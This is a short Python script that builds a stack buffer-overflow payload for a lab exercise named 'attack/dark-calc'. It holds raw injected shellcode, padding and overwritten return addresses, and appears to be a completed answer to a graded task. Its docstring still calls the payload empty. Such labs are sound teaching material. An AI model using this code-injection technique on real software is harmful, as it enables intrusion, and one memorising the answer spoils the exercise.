#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

shellcode=b'\xbf\x04\x00\x00\x00'
shellcode+=b'\x68\x87\x1a\x40\x00'
shellcode+=b'\xc3'
buf_addr=0x721000800fd0
payload=shellcode.ljust(24,b'\x00')+buf_addr.to_bytes(8,'little')+(0x401880).to_bytes(8,'little')

sys.stdout.buffer.write(payload)
